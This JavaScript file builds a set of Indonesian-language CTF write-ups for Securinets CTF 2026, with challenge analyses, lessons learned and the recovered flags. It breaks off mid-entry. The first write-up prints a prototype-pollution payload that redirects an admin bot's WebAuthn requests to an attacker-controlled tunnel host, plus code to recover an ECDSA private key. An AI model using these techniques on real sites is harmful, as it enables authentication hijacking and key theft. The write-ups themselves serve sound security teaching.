import fs from 'fs';
import { execSync } from 'child_process';
import path from 'path';

const BASE = '/home/nata/ctf/securinets2026';

function readWSL(relPath) {
  try {
    return execSync(`wsl -d Ubuntu cat "${BASE}/${relPath}"`, {
      encoding: 'utf8',
      maxBuffer: 50 * 1024 * 1024,
    });
  } catch (e) {
    console.error(`Failed to read ${relPath}:`, e.message);
    return '';
  }
}

// 1. Misdirection 1
const misdir1_md = readWSL('crypto/Misdirection1/Readme.md');
const misdir1_solve = readWSL('crypto/Misdirection1/solve.py');
const misdir1_decrypt = readWSL('crypto/Misdirection1/decrypt_flag.py');

// 2. Misdirection 2
const misdir2_md = readWSL('crypto/Misdirection2/Readme.md');
const misdir2_solve = readWSL('crypto/Misdirection2/solve.py');

// 3. New Calculator
const newcal_md = readWSL('crypto/NewCalculator/Readme.md');
const newcal_solve = readWSL('crypto/NewCalculator/solve.py');

// 4. Old Calculator
const oldcal_md = readWSL('crypto/oldCalculator/Readme.md');
const oldcal_solve = readWSL('crypto/oldCalculator/solve.py');

// 5. DumPwn
const dumpwn_md = readWSL('foren/DumPwn/Readme.md');
const dumpwn_solve = readWSL('foren/DumPwn/solve.py');

// 6. Silent Tone
const silent_md = readWSL('foren/SilentTone/Readme.md');
const silent_solve = readWSL('foren/SilentTone/solve_final.py');

// 7. A Whisper in the Air
const whisper_md = readWSL('hardware/AWhisperintheAir/Readme.md');
const whisper_solve = readWSL('hardware/AWhisperintheAir/solve.py');
const whisper_c = readWSL('hardware/AWhisperintheAir/crack_passkey.c');

// 8. Gelatino
const gelatino_md = readWSL('hardware/Gelatino/Readme.md');
const gelatino_solve = readWSL('hardware/Gelatino/solve.py');

// 9. Backdrop
const backdrop_md = readWSL('mobile/backdrop/Readme.md');
const backdrop_solve = readWSL('mobile/backdrop/solve.py');

// 10. House of Ekko
const ekko_md = readWSL('pwn/HouseOfEkko/house_of_ekko_writeup.md');
const ekko_solve = readWSL('pwn/HouseOfEkko/solve.py');

// 11. Over?flow
const overflow_md = readWSL('pwn/OverFlow/Readme.md');
const overflow_solve = readWSL('pwn/OverFlow/solve.py');

// 12. Bitflip
const bitflip_md = readWSL('pwn/bitflip/Readme.md');
const bitflip_solve = readWSL('pwn/bitflip/solve.py');

// 13. Crust
const crust_md = readWSL('pwn/crust/Readme.md');
const crust_solve = readWSL('pwn/crust/solve.py');

// 14. Encrypt
const encrypt_md = readWSL('rev/Encrypt/Readme.md');
const encrypt_solve = readWSL('rev/Encrypt/solve.py');

// 15. letmethink
const letme_md = readWSL('rev/letmethink/writeup.md');
const letme_unpack = readWSL('rev/letmethink/unpack.py');
const letme_vm_solve = readWSL('rev/letmethink/vm_solve.py');
const letme_recover = readWSL('rev/letmethink/recover_flag.py');

// 16. Revenant
const rev_md = readWSL('rev/revenant/Readme.md');
const rev_solve = readWSL('rev/revenant/solve.py');

// 17. Nyoom
const nyoom_md = readWSL('web/Nyoom/nyoom_src/nyoom_writeup.md');
const nyoom_solve = readWSL('web/Nyoom/nyoom_src/solve.py');
const nyoom_gate = readWSL('web/Nyoom/nyoom_src/solve_nyoom_gate.py');

const writeups = [
  // 1. Misdirection 1
  {
    id: "securinets-crypto-misdirection1",
    title: "Misdirection: Part 1",
    category: "Crypto",
    difficulty: "Medium",
    points: 200,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Crypto", "WebAuthn", "ECDSA", "AES-ECB", "Nonce Reuse", "Prototype Pollution"],
    description: "Eksploitasi WebAuthn authentication bot menggunakan prototype pollution untuk membelokkan autentikasi ke callback server, diikuti pemulihan private key ECDSA dari reuse deterministic nonce untuk mendekripsi ciphertext flag AES-256-ECB secara offline.",
    problemDescription: `## Ringkasan

Challenge Web/Crypto bertema WebAuthn, admin bot, dan AES-ECB. Flag diperoleh **secara offline** dari ciphertext yang diberikan dalam hint, setelah private key ECDSA admin dipulihkan dari signature bot.

## Target dan File

- **Target Scope:** \`https://xch1.bit-raven.com\`
- **Artefak:** \`misdir.zip\` (berisi \`frontend/src/App.tsx\`, \`frontend/src/lib/auth.tsx\`, \`bot/authenticator.js\`, \`bot/auth-flow.js\`, \`backend/src/auth.rs\`, dan migrasi awal Postgres \`backend/migrations/20260317192004_init.sql\`)
- **Hint:** Ciphertext AES-ECB hex:
  \`\`\`text
  e2cd291adf58c0735c32090f7eb496356965f3f153c572442118ed25d7b540d02e4bd3198db36ace7c3294437db04efbe367338f3dcfaf4504e2c67da81e9b32
  \`\`\``,
    tools: ["Python 3", "cryptography", "ecdsa", "hashlib", "Cloudflare Tunnel"],
    analysis: `## Source Code Review & Architecture

Terdapat empat komponen utama dalam arsitektur challenge:

1. **Frontend Prototype Pollution (\`frontend/src/App.tsx\`)**:
   Query parameter \`settings\` diparsing sebagai JSON lalu digabung ke objek kosong menggunakan fungsi \`deepMerge()\`:
   \`\`\`typescript
   function deepMerge(target: any, source: any) {
     for (const key in source) {
       if (source[key] instanceof Object && key in target) {
         deepMerge(target[key], source[key]);
       } else {
         target[key] = source[key];
       }
     }
   }
   const raw = new URLSearchParams(window.location.search).get('settings');
   if (raw) deepMerge({}, JSON.parse(raw));
   \`\`\`
   Karena tidak memblokir key \`__proto__\`, ketika \`key === '__proto__'\`, \`target[key]\` bernilai \`Object.prototype\`. Payload JSON seperti:
   \`\`\`json
   {"__proto__": {"baseURL": "https://attacker-tunnel.trycloudflare.com"}}
   \`\`\`
   akan mencemari properti \`Object.prototype.baseURL\` secara global pada runtime browser bot.

2. **WebAuthn Redirection (\`frontend/src/lib/auth.tsx\`)**:
   Fungsi \`getAuthUrl()\` yang menentukan endpoint API autentikasi WebAuthn mempercayai properti \`baseURL\`:
   \`\`\`typescript
   export const getAuthUrl = () =>
     (Object.prototype as any).baseURL || window.location.origin;
   \`\`\`
   Akibatnya, pemanggilan API autentikasi bot (\`/register_start\`, \`/register_finish\`, \`/login_start\`, \`/login_finish\`) dialihkan ke server callback yang kita kontrol, bukan ke backend asli.

3. **Deterministic ECDSA Nonce (\`bot/authenticator.js\`)**:
   Admin bot mengimplementasikan authenticator virtual berbasis kurva NIST P-256 (\`secp256r1\`). Namun saat melakukan signing assertion autentikasi, nonce $k$ dihitung secara deterministik dari hash \`rpId\`:
   \`\`\`javascript
   const k = new BN(sha256(rpId), 16);
   \`\`\`
   alih-alih menghasilkan nonce acak per transaksi (atau RFC 6979 berbasis hash pesan dan private key). Karena \`rpId\` adalah string publik (\`xch1.bit-raven.com\`), nilai nonce $k$ diketahui sepenuhnya oleh penyerang!

4. **Validasi Kunci Admin (\`backend/migrations/20260317192004_init.sql\`)**:
   Database Postgres menyimpan kredensial admin beserta public key ECDSA \`(x, y)\` aslinya. Informasi ini sangat berguna untuk memverifikasi apakah kandidat private key yang kita pulihkan benar-benar milik admin.

---

## Matematika Eksploitasi ECDSA Nonce Reuse

Dalam skema penandatanganan ECDSA pada kurva eliptik P-256:
- Parameter kurva: generator $G$, orde subgrup $n$.
- Kunci privat: integer rahasia $d \\in [1, n-1]$.
- Kunci publik: $Q = [d]G$.

Untuk menandatangani digest pesan $z$:
1. Pilih nonce $k \\in [1, n-1]$.
2. Hitung titik $R = [k]G = (x_1, y_1)$, dengan $r = x_1 \\pmod n$.
3. Hitung $s \\equiv k^{-1} (z + r \\cdot d) \\pmod n$.
4. Signature adalah pasangan $(r, s)$.

Jika nonce $k$ diketahui atau dapat diprediksi:
$$s \\cdot k \\equiv z + r \\cdot d \\pmod n$$
$$r \\cdot d \\equiv s \\cdot k - z \\pmod n$$
Karena $\\gcd(r, n) = 1$, kita dapat mengalikan kedua ruas dengan invers modular $r^{-1} \\pmod n$:
$$\\boxed{d \\equiv (s \\cdot k - z) \\cdot r^{-1} \\pmod n}$$

Pada WebAuthn assertion:
- $z = \\operatorname{int}(\\operatorname{SHA256}(\\text{authenticatorData} \\parallel \\operatorname{SHA256}(\\text{clientDataJSON}))) \\pmod n$
- $k = \\operatorname{int}(\\operatorname{SHA256}(\\text{rpId})) \\pmod n$
- Nilai $(r, s)$ diekstrak dari format ASN.1 DER signature pada field \`response.signature\`.
- **Ambiguitas Tanda:** Standar atau library kriptografi terkadang menggunakan $s$ atau $-s \\pmod n$. Oleh karena itu kita menghitung $d$ untuk kedua nilai $s$ dan $(-s) \\pmod n$, lalu memverifikasi apakah $[d]G$ cocok dengan public key admin yang terdaftar.

---

## Derivasi Kunci AES & Dekripsi Offline

Setelah private key admin $d$ dipulihkan:
\`\`\`text
d = abf9e91ac6b24259d8523f8d86e7be778484af175d2c3fad389a64510621cdf7
\`\`\`
Kunci AES-256 diperoleh melalui SHA-256 dari string heksadesimal private key:
\`\`\`python
key = hashlib.sha256(b"abf9e91ac6b24259d8523f8d86e7be778484af175d2c3fad389a64510621cdf7").digest()
\`\`\`
Ciphertext didekripsi menggunakan AES mode ECB:
- Plaintext hasil dekripsi adalah \`Securinets{sm0l_b0t_biG_DREAAAAAAMS}\`.
- Diikuti oleh padding PKCS#7 sebanyak 28 byte \`0x1c\` (karena panjang block AES adalah 16 byte atau kelipatannya).`,
    solution: [
      {
        title: "Konfigurasi Callback & Trigger Prototype Pollution",
        content: `Jalankan server callback lokal menggunakan Cloudflare Tunnel:
\`\`\`bash
cloudflared tunnel --url http://127.0.0.1:8765
\`\`\`
Kirimkan URL payload prototype pollution ke endpoint \`/report\`:
\`\`\`python
payload = {"__proto__": {"baseURL": "https://<your-tunnel>.trycloudflare.com"}}
report_url = "https://xch1.bit-raven.com/?settings=" + quote(json.dumps(payload))
requests.post("https://xch1.bit-raven.com/report", json={"url": report_url})
\`\`\`
Ketika bot mengunjungi URL ini, \`Object.prototype.baseURL\` akan tercemar dan mengarahkan assertion WebAuthn ke callback tunnel.`,
        code: ""
      },
      {
        title: "Menangkap Assertion & Rekonstruksi Private Key",
        content: `Callback menangkap payload \`/login_finish\` yang dikirimkan oleh bot, mengekstrak signature $(r, s)$, dan memulihkan private key:
\`\`\`python
# Nonce dihitung dari sha256(rp_id)
k = int.from_bytes(hashlib.sha256(b'xch1.bit-raven.com').digest(), 'big') % N
# Message digest
msg = authdata + hashlib.sha256(clientdata).digest()
z = int.from_bytes(hashlib.sha256(msg).digest(), 'big') % N

# Recover private key candidates
for signed_s in (s, (-s) % N):
    d = ((signed_s * k - z) * pow(r, -1, N)) % N
    if get_pub(d) == expected_admin_pub:
        print("[+] Admin Private Key Recovered:", hex(d))
\`\`\``,
        code: ""
      },
      {
        title: "Full Exploit Script (solve.py)",
        content: `Script Python lengkap yang menjalankan server callback WebAuthn lokal, memicu admin bot melalui endpoint \`/report\`, menangkap signature, memulihkan private key ECDSA, dan mendekripsi ciphertext hint.`,
        code: misdir1_solve
      },
      {
        title: "Offline Flag Decryption Script (decrypt_flag.py)",
        content: `Script dekripsi AES-256-ECB offline yang menggunakan private key ECDSA yang telah berhasil dipulihkan. Script ini tidak memerlukan koneksi jaringan atau tunnel.`,
        code: misdir1_decrypt
      }
    ],
    terminalOutputs: [
      {
        command: "python3 decrypt_flag.py",
        output: "<FLAG>Securinets{sm0l_b0t_biG_DREAAAAAAMS}</FLAG>"
      }
    ],
    flag: "Securinets{sm0l_b0t_biG_DREAAAAAAMS}",
    lessonsLearned: `1. **Kerahasiaan & Keacakan Nonce ECDSA Mutlak Diperlukan**: Menggunakan nonce deterministik yang berasal dari string publik seperti \`rpId\` membatalkan seluruh jaminan keamanan ECDSA. Penyerang hanya butuh tepat satu signature untuk memulihkan private key secara aljabar.
2. **Bahaya Prototype Pollution di Frontend**: Penggabungan objek JSON rekursif (\`deepMerge\`) tanpa sanitasi key sensitif (\`__proto__\`, \`constructor\`, \`prototype\`) dapat membajak variabel konfigurasi kritis seperti \`baseURL\` dan membelokkan alur otentikasi.
3. **Validasi Origin & Domain**: Authenticator dan backend harus menerapkan validasi asal (origin verification) yang ketat dan tidak mengandalkan setting dinamis dari client.`
  },

  // 2. Misdirection 2
  {
    id: "securinets-crypto-misdirection2",
    title: "Misdirection: Part 2",
    category: "Crypto",
    difficulty: "Hard",
    points: 300,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Crypto", "WebAuthn", "ECDSA", "Invalid Curve Attack", "PRF", "CRT", "Prototype Pollution"],
    description: "Invalid curve attack pada WebAuthn PRF extension milik admin bot. Titik kurva palsu berorde kecil disuntikkan via prototype pollution, lalu residu skalar dikumpulkan dan digabung menggunakan Chinese Remainder Theorem (CRT) untuk memulihkan private key admin.",
    problemDescription: `## Ringkasan

Challenge ini memakai WebAuthn dengan admin bot yang menyimpan private key P-256. Di Part 2, bot menyediakan PRF yang mengalikan private key dengan titik elliptic curve dari input ekstensi WebAuthn tanpa memvalidasi bahwa titik tersebut benar-benar berada pada kurva P-256.

Frontend memiliki prototype pollution yang bisa mengarahkan permintaan autentikasi bot ke server callback kita. Callback menyisipkan titik kurva pilihan sebagai PRF salt. Bot kemudian mengembalikan \`SHA256(x([d]P))\` melalui field \`response.userHandle\`. Karena kita memilih titik berorde kecil, hasil hash tersebut bisa dicocokkan untuk mengetahui \`d\` modulo orde titik, dengan ambiguitas tanda. Banyak residu digabung memakai Chinese Remainder Theorem (CRT) dan meet-in-the-middle sampai private key admin pulih. Private key itu dipakai untuk mendekripsi ciphertext AES-256-ECB dari hint.

## Target dan File
- **Target:** \`https://xch2.bit-raven.com\`
- **Artefak:** \`misdir2.zip\`, \`solve.py\` (SageMath solver)
- **Hint Ciphertext (64 byte):**
  \`\`\`text
  785317781b490d1bfd7667a99f1fa0caefd8fbfa73147571dbda899ca82b1c41b80db2923577dcf9527ec31872138258ef9295bcff2f96e477611ff6e92efcb0
  \`\`\``,
    tools: ["SageMath", "Python 3", "cryptography", "Cloudflare Tunnel"],
    analysis: misdir2_md,
    solution: [
      {
        title: "Invalid Curve Attack & SageMath Solver (solve.py)",
        content: `Solver SageMath lengkap yang mengimplementasikan pencarian titik kurva berorde kecil pada kurva singular ($b = 2$, $b = -2$) dan nonsingular, server callback HTTP untuk menerima evaluasi PRF WebAuthn bot, Chinese Remainder Theorem (CRT), brute force meet-in-the-middle, dan dekripsi AES-256-ECB.`,
        code: misdir2_solve
      }
    ],
    terminalOutputs: [
      {
        command: "sage -python solve.py decrypt",
        output: "<FLAG>Securinets{c0unterfeiting_d0Ma1ns_like_th3_M4fiA}</FLAG>"
      }
    ],
    flag: "Securinets{c0unterfeiting_d0Ma1ns_like_th3_M4fiA}",
    lessonsLearned: `1. **Validasi Titik Kurva Elipktik (Point Validation)**: Setiap operasi perkalian skalar $[d]P$ dengan titik input dari pihak luar wajib memverifikasi bahwa koordinat $(x, y)$ memenuhi persamaan kurva $y^2 = x^3 + ax + b \\pmod p$. Rumus penjumlahan titik standar Weierstrass pendek tidak menggunakan konstanta $b$, sehingga perkalian tetap berjalan di kurva lain yang mungkin memiliki orde subgrup kecil (smooth order).
2. **Keamanan PRF Extension WebAuthn**: PRF salt yang dipetakan ke titik kurva harus menggunakan hash-to-curve yang aman atau memvalidasi keanggotaan subgrup prima secara ketat.`
  },

  // 3. New Calculator
  {
    id: "securinets-crypto-newcalculator",
    title: "New Calculator",
    category: "Crypto",
    difficulty: "Hard",
    points: 350,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Crypto", "Timing Side Channel", "Algebraic Reconstruction", "Group Testing"],
    description: "Eksploitasi timing side-channel pada arbitrary-precision integer arithmetic untuk merekonstruksi koefisien kuadratik rahasia 8-bit (16 ronde).",
    problemDescription: `## Overview
New Calculator provides two arrays, \`x\` and \`y\`, related by a secret quadratic function:
\\[ y_i = ax_i^2 \\]
The coefficient \`a\` is randomly generated as an 8-bit integer. The calculator supports arithmetic operations through a JSON interface, but only permits one valid 8-bit submission before asking for the secret coefficient.

Our objective is to recover \`a\` across 16 consecutive rounds without exhausting the submission mechanism.`,
    tools: ["Python 3", "SageMath", "Timing Side-Channel", "Arbitrary-Precision Arithmetic"],
    analysis: newcal_md,
    solution: [
      {
        title: "Timing Side-Channel Exploitation Script (solve.py)",
        content: `Script Python lengkap untuk menghubungkan ke remote socket, membangun polinomial uji keanggotaan grup, memperbesar waktu komputasi menggunakan eksponensiasi besar ($C = 3^{2048}$ diskuadratkan 10 kali), mengklasifikasikan timing latency secara adaptif, dan memulihkan koefisien 8-bit untuk 16 ronde.`,
        code: newcal_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Round 16/16 complete!\n[+] Flag: Securinets{40508ea8a6ad1a112cf14a65d97025607f4ae934c979f2753099ee82b2898517}"
      }
    ],
    flag: "Securinets{40508ea8a6ad1a112cf14a65d97025607f4ae934c979f2753099ee82b2898517}",
    lessonsLearned: `1. **Batasan Arbitrary Precision**: Membatasi ukuran submit input pada 8-bit tidak berguna jika kalkulator mengizinkan evaluasi ekspresi aritmatika dengan operand berukuran tak hingga.
2. **Timing Side-Channel via Arithmetic Complexity**: Waktu perkalian integer tumbuh secara superlinear seiring pertambahan jumlah digit. Dengan mengalikan ekspresi uji dengan konstanta masif jika dan hanya jika ekspresi tersebut bernilai bukan nol, perbedaan latensi komputasi dapat dideteksi secara andal melalui jaringan.`
  },

  // 4. Old Calculator
  {
    id: "securinets-crypto-oldcalculator",
    title: "Old Calculator",
    category: "Crypto",
    difficulty: "Hard",
    points: 350,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Crypto", "Timing Side Channel", "Affine Function", "Group Testing"],
    description: "Pemulihan parameter fungsi affine rahasia F(x) = ax + b melalui timing side-channel aritmatika presisi tinggi dan binary group testing.",
    problemDescription: `## Overview
The challenge provides a JSON-based calculator with two arrays, \`x\` and \`y\`, each containing 100 elements. It supports basic arithmetic operations, including addition, multiplication, and operations involving constants.

The calculator allows one \`submit\` operation to reveal an 8-bit value. After submission, the server presents a random number and asks us to predict the output of a hidden mathematical function:
\\[ F(x) = ax + b \\]
To obtain the flag, we must correctly answer **16 consecutive rounds**.`,
    tools: ["Python 3", "Timing Analysis", "Group Testing", "Arbitrary-Precision Arithmetic"],
    analysis: oldcal_md,
    solution: [
      {
        title: "Full Exploit Solver (solve.py)",
        content: `Script Python lengkap yang memulihkan slope \`a\` dan intercept \`b\` pada setiap ronde menggunakan polynomial membership test yang dikombinasikan dengan timing amplifier, lalu memprediksi nilai target fungsi pada tahap verifikasi.`,
        code: oldcal_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Round 16: Solved!\n[+] Flag: Securinets{ed9a482110a5a6936482e700155f811742f97a04decfa75d3cee28bca77239c1}"
      }
    ],
    flag: "Securinets{ed9a482110a5a6936482e700155f811742f97a04decfa75d3cee28bca77239c1}",
    lessonsLearned: `1. **Collinearity Test**: Verifikasi fungsi affine dapat dibuktikan secara independen dari pasangan koordinat menggunakan determinan kolinearitas 2D: $(y_1 - y_0)(x_2 - x_0) - (y_2 - y_0)(x_1 - x_0) = 0$.
2. **Mitigasi Noise Jaringan**: Pengukuran latensi jaringan rentan terhadap jitter. Menggunakan beberapa probe repetitif dan membandingkan deviasi standar / threshold median terbukti krusial untuk kestabilan exploit 16 ronde.`
  },

  // 5. DumPwn
  {
    id: "securinets-forensics-dumpwn",
    title: "DumPwn",
    category: "Forensics",
    difficulty: "Medium",
    points: 250,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Forensics", "Crash Dump", "Windows Internals", "ROP", "PTE", "Transition PTE"],
    description: "Analisis Windows x64 memory dump (ctf.dmp). Mengidentifikasi driver rootkit bomb.sys/VaultKM, merekonstruksi ROP chain taskhostw.exe, melacak transisi PTE ke physical page memory, dan mendekripsi XOR cipher flag.",
    problemDescription: dumpwn_md.split('## ROP dan PTE transition')[0].trim(),
    tools: ["WinDbg", "Python 3", "Volatility 3", "x64 ROP Chain Analysis"],
    analysis: dumpwn_md,
    solution: [
      {
        title: "Self-Contained Dump Decoder (solve.py)",
        content: `Script Python mandiri yang mengekstrak blok memori 32-byte pada physical page transition PTE dan melakukan XOR decoding dengan key 16-byte dari \`taskhostw\`.`,
        code: dumpwn_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "<FLAG>Securinets{this_is_real_flag}</FLAG>"
      }
    ],
    flag: "Securinets{this_is_real_flag}",
    lessonsLearned: `1. **Waspada Prompt-Injection Decoy**: File executable seperti \`flaws.exe\` sengaja menaruh string flag palsu untuk mengecoh pencarian string langsung (\`strings -a\`).
2. **Transition PTEs di Windows Memory**: Page table entry yang berstatus *Transition* (tidak Present) menunjuk ke PFN fisik di standby/modified list. Page walker sederhana yang hanya memeriksa bit Present akan gagal memetakan virtual address kernel tersebut.`
  },

  // 6. Silent Tone
  {
    id: "securinets-forensics-silenttone",
    title: "Silent Tone",
    category: "Forensics",
    difficulty: "Hard",
    points: 400,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Forensics", "SDR", "QPSK", "Signal Processing", "Reed-Solomon", "Zadoff-Chu"],
    description: "Analisis sinyal radio Saleae Logic 8 MHz I/Q. Ekstraksi sampel analog, matched filtering preamble Zadoff-Chu (root 29, 47, 104), pembatalan interferensi sinyal, demodulasi QPSK, koreksi Reed-Solomon RS(255,223), dan dekripsi keystream SHA-256-CTR.",
    problemDescription: silent_md.split('## Dari I/Q ke dua codeword')[0].trim(),
    tools: ["Python 3", "NumPy", "SciPy", "Saleae Logic", "Reed-Solomon RS(255,223)"],
    analysis: silent_md + "\n\n## Visualisasi Sinyal\n\n![Scatter plot I/Q signal](/assets/writeups/securinets/foren-silenttone/scatter.png)\n\n![Spectrogram sinyal radio](/assets/writeups/securinets/foren-silenttone/spectro.png)",
    solution: [
      {
        title: "SDR QPSK Pipeline & Reed-Solomon Decoder (solve_final.py)",
        content: `Script Python lengkap yang memproses sinyal I/Q dari Saleae capture, menyelaraskan frame simbol, mendekode codeword Reed-Solomon, dan merekonstruksi payload flag.`,
        code: silent_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve_final.py",
        output: "[+] Codewords decoded successfully.\n[+] Flag: Securinets{d0ppl3r_w13n3r_r4pp_rlc_g4rdn3r_3kf_rs255_ph4nt0m}"
      }
    ],
    flag: "Securinets{d0ppl3r_w13n3r_r4pp_rlc_g4rdn3r_3kf_rs255_ph4nt0m}",
    lessonsLearned: `1. **Format File Analog Saleae**: File \`.sal\` Saleae menyisipkan metadata preview/min-max di antara stream analog. Membaca file mentah sebagai raw float tanpa memfilter blok preview menyebabkan de-sinkronisasi sampel.
2. **Validasi Reed-Solomon**: Reed-Solomon decoder dapat memvalidasi codeword yang salah jika noise terlalu tinggi atau sinkronisasi simbol bergeser. Selalu verifikasi header/checksum internal payload.`
  },

  // 7. A Whisper in the Air
  {
    id: "securinets-hardware-awhisperintheair",
    title: "A Whisper in the Air",
    category: "Hardware",
    difficulty: "Hard",
    points: 400,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Hardware", "BLE", "Bluetooth", "HID", "Passkey", "SMP", "AES-CCM"],
    description: "Dekripsi lalu-lintas Bluetooth Low Energy (BLE). Memecahkan PIN pairing BLE Legacy menggunakan brute-force OpenSSL C, menurunkan STK dan LTK, memfilter sesi decoy, mendekripsi laporan HID keyboard AES-CCM, dan mengonversi scancode ke flag.",
    problemDescription: whisper_md.split('## Analisis Awal')[0].trim(),
    tools: ["Python 3", "C (OpenSSL)", "Wireshark", "BLE SMP", "AES-CCM"],
    analysis: whisper_md,
    solution: [
      {
        title: "Brute-force PIN Pairing BLE Legacy (crack_passkey.c)",
        content: `Program C paralel berkecepatan tinggi yang menguji passkey BLE 6 digit (\`000000\` s.d. \`999999\`) menggunakan fungsi enkripsi AES-128 SMP c1 untuk memverifikasi Confirm dan Random value.`,
        code: whisper_c
      },
      {
        title: "BLE Packet Reassembly & HID Scancode Decoder (solve.py)",
        content: `Script Python lengkap yang memfilter frame berdasarkan Access Address koneksi keyboard, menerapkan dekripsi AES-CCM dengan LTK yang dipulihkan, memetakan USB HID scancodes ke karakter ASCII, dan mendekode Base64 flag.`,
        code: whisper_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Decrypted HID reports: 42 keypresses\n[+] Typed message: U2VjdXJpbmV0c3tibDNfazN5YjBhcmRfdzM0a19US30=\n[+] Flag: Securinets{bl3_k3yb0ard_w34k_TK}"
      }
    ],
    flag: "Securinets{bl3_k3yb0ard_w34k_TK}",
    lessonsLearned: `1. **Kerapuhan BLE Legacy Pairing**: BLE Legacy PIN pairing hanya memiliki ruang kunci 1.000.000 kemungkinan (6 digit desimal), yang dapat dipecahkan dalam hitungan detik menggunakan satu core CPU.
2. **Pentingnya BLE Secure Connections (LESC)**: Protokol modern harus mewajibkan LESC berbasis ECDH (P-256) untuk mencegah passive eavesdropping.`
  },

  // 8. Gelatino
  {
    id: "securinets-hardware-gelatino",
    title: "Gelatino",
    category: "Hardware",
    difficulty: "Medium",
    points: 300,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Hardware", "Disk Forensics", "LUKS2", "EFI", "GPT", "Custom Loader"],
    description: "Analisis disk image GPT 150 MiB. Reverse engineering custom EFI loader BOOTX64.EFI, decoding arsip terenkripsi memdisk.pack, menemukan passphrase vault LUKS2, dan membuka partisi terenkripsi.",
    problemDescription: gelatino_md.split('## Analisis Awal')[0].trim(),
    tools: ["Python 3", "cryptsetup", "QEMU/OVMF", "Ghidra", "cpio"],
    analysis: gelatino_md,
    solution: [
      {
        title: "End-to-End Image Unpacker & Solver (solve.py)",
        content: `Script Python yang mereproduksi logika de-obfuscation \`BOOTX64.EFI\` (ROR8 dan XOR affine), mengekstrak arsip cpio, memparsing order history untuk menemukan password \`pistachio-37\`, dan mendekripsi partisi LUKS.`,
        code: gelatino_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Vault password verified: pistachio-37\n[+] Flag: Securinets{n3xt_time_buy_s0m3th1ng_h34lthy}"
      }
    ],
    flag: "Securinets{n3xt_time_buy_s0m3th1ng_h34lthy}",
    lessonsLearned: `1. **In-Memory Payloads di EFI Loader**: Loader UEFI custom sering kali mengaburkan komponen bootloader berikutnya di dalam format memdisk khusus sebelum menyerahkan kontrol ke GRUB.
2. **Analisis Order History / Metadata**: Kredensial penting sering kali disembunyikan dalam riwayat transaksi dummy di dalam sistem file embedded.`
  },

  // 9. Backdrop
  {
    id: "securinets-mobile-backdrop",
    title: "Backdrop",
    category: "Mobile",
    difficulty: "Hard",
    points: 450,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Mobile", "Flutter", "Dart AOT", "AES-GCM", "RLE", "SplitMix64", "Reverse Engineering"],
    description: "Reverse engineering aplikasi Android Flutter rilis (Dart AOT x86_64). Derivasi kunci AES-256-GCM dari signature certificate, pembalikan cipher stream XOR dan RLE per-tile 32x32, serta rekonstruksi permutasi grid menggunakan PRNG SplitMix64.",
    problemDescription: backdrop_md.split('## Analisis native — derivasi kunci dan AES-GCM')[0].trim(),
    tools: ["Python 3", "cryptography", "Dart AOT Reversing", "Pillow (PIL)", "SplitMix64"],
    analysis: backdrop_md + "\n\n## Flag Image (Decrypted & Reassembled)\n\n![Decrypted flag image](/assets/writeups/securinets/mobile-backdrop/flag.png)",
    solution: [
      {
        title: "Full Offline Reconstructor & Image Assembler (solve.py)",
        content: `Script Python lengkap yang memvalidasi sertifikat APK, mendekripsi blob BDF1 AES-GCM, membalik stream XOR Dart AOT, men-decode blok RLE 32x32, meregenerasi permutasi koordinat SplitMix64, dan menyusun kembali gambar flag.png.`,
        code: backdrop_solve
      }
    ],
    terminalOutputs: [
      {
        command: "python3 solve.py",
        output: "[+] Decrypted 19756 bytes AES-GCM payload\n[+] De-scrambled 64 image tiles using SplitMix64\n[+] flag.png generated successfully!\n[+] OCR Flag: Securinets{https://github.com/flutter/flutter/issues/163421}"
      }
    ],
    flag: "Securinets{https://github.com/flutter/flutter/issues/163421}",
    lessonsLearned: `1. **Dart AOT Snapshot Reversing**: Kode logika bisnis Flutter pada rilis production tidak tersimpan sebagai bytecode Dalvik, melainkan compiled native code (\`libapp.so\`). Analisis membutuhkan penelusuran panggilan invoke method channel native ke AOT functions.
2. **Visual Flag Rendering**: Flag tidak selalu berwujud string di memori; pada aplikasi GUI atau game, flag sering dirender sebagai grafik vektor/bitmap terenkripsi.`
  },

  // 10. House of Ekko
  {
    id: "securinets-pwn-houseofekko",
    title: "House of Ekko",
    category: "Pwn",
    difficulty: "Hard",
    points: 500,
    date: "2026-10-17",
    author: "Nattt",
    ctfName: "Securinets CTF 2026",
    tags: ["Pwn", "Heap", "FSOP", "glibc 2.43", "Largebin", "Smallbin", "File Structure"],
    description: "Heap exploitation canggih pada glibc 2.43. Memanfaatkan dangling pointer setelah free pada 2-slot note manager, cross-bin corruption antara smallbin dan largebin, smallbin poisoning ke main_arena libc, dan FSOP via _IO_list_all / wide-data jump table ke system(\" sh;\").",
    problemDescription: ekko_md.split('## 2. Challenge files and protections')[0].trim(),
    tools: ["pwntools", "GDB", "GEF", "glibc 2.43", "FSOP", "File Stream Internals"],
    analysis: ekko_md,
    solution: [
      {
        title: "Full glibc 2.43 Cross-Bin FSOP Exploit (solve.py)",
        content: `Exploit pwntools lengkap yang melewati proteksi heap glibc 2.43 terbaru, membocorkan pointer unsorted-bin, memanipulasi metadata smallbin/largebin, memanggil malloc untuk mengembalikan pointer libc, memalsukan struct FILE dan wide-data jumps, serta memicu eksekusi shell.`,
        code: ekko_solve
      }
    ],
    terminalOutputs: [
      {
